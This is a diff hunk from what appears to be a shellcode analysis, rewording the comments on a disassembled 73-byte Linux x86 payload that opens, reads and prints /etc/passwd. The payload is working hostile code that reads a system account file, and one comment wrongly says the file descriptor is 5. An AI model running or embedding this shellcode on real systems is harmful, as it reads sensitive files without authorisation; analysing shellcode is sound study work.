@@ -274,24 +274,24 @@ No encoder or badchars specified, outputting raw payload
 Payload size: 73 bytes
 
 00000000  EB36		jmp short 0x38		        ; jmp to address 0x38 (jmp, call, pop)
-00000002  B805000000    mov eax,0x5			; 0x5 syscall = open
+00000002  B805000000    mov eax,0x5			; open syscall = 0x5
 00000007  5B            pop ebx				; pop address of /etc/passwd into ebx
-00000008  31C9          xor ecx,ecx			; zero ecx to open file as O_RDONLY
-0000000A  CD80          int 0x80			; syscall int open(const char *pathname, int flags);
-0000000C  89C3          mov ebx,eax			; move 5 into ebx (fd)
-0000000E  B803000000    mov eax,0x3			; 0x3 syscall = read
-00000013  89E7          mov edi,esp			; stack pointer into edi
-00000015  89F9          mov ecx,edi			; stack pointer to ecx
-00000017  BA00100000    mov edx,0x1000		        ; 0x1000 = 4096 
-0000001C  CD80          int 0x80			; syscall ssize_t read(int fd, void *buf, size_t count);
+00000008  31C9          xor ecx,ecx			; zeroize ecx register, open file as O_RDONLY
+0000000A  CD80          int 0x80			; call the interrupt to execute the open syscall
+0000000C  89C3          mov ebx,eax			; move eax into ebx (0x5)
+0000000E  B803000000    mov eax,0x3			; read syscall = 0x3
+00000013  89E7          mov edi,esp			; move stack pointer into edi
+00000015  89F9          mov ecx,edi			; move stack pointer into ecx
+00000017  BA00100000    mov edx,0x1000		        ; move 0x1000 (4096) into edx 
+0000001C  CD80          int 0x80			; call the interrupt to execute the read syscall
 0000001E  89C2          mov edx,eax			; size of read data
-00000020  B804000000    mov eax,0x4			; 0x4 syscall = write
-00000025  BB01000000    mov ebx,0x1			; stdout = 1 (our fd)
-0000002A  CD80          int 0x80			; syscall ssize_t write(int fd, const void *buf, size_t count); 
-0000002C  B801000000    mov eax,0x1			; 0x1 syscall = exit
-00000031  BB00000000    mov ebx,0x0			; 0 exit/return code
-00000036  CD80          int 0x80			; syscall  void exit(int status);
-00000038  E8C5FFFFFF    call 0x2			; jmp up, putting next instruction on stack
+00000020  B804000000    mov eax,0x4			; write syscall = 0x4 
+00000025  BB01000000    mov ebx,0x1			; move 0x1 (stdout) into ebx stdout
+0000002A  CD80          int 0x80			; call the interrupt to execute the write syscall 
+0000002C  B801000000    mov eax,0x1			; exit syscall = 0x1
+00000031  BB00000000    mov ebx,0x0			; move 0 (exit/return code) into ebx
+00000036  CD80          int 0x80			; call the interrupt to execute the exit syscall
+00000038  E8C5FFFFFF    call 0x2			; jmp up, put next instruction onto the stack
 0000003D  2F            das				; read the file contents (/etc/passwd)
 0000003E  657463        gs jz 0xa4
 00000041  2F            das
